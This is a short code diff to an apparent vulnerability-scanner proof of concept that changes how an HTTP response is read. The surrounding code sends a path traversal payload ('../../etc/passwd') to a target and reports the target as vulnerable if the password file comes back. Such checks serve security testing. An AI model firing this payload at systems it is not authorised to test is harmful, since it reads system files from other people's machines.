@@ -57,7 +57,7 @@ class Poc(ABPoc):
             }
             data = 'file_name=x&file_array[]=../../etc/passwd'
             response = requests.post(
-                vul_url, data=data, headers=headers).content
+                vul_url, data=data, headers=headers).text
             if 'daemon:/sbin:' in response:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
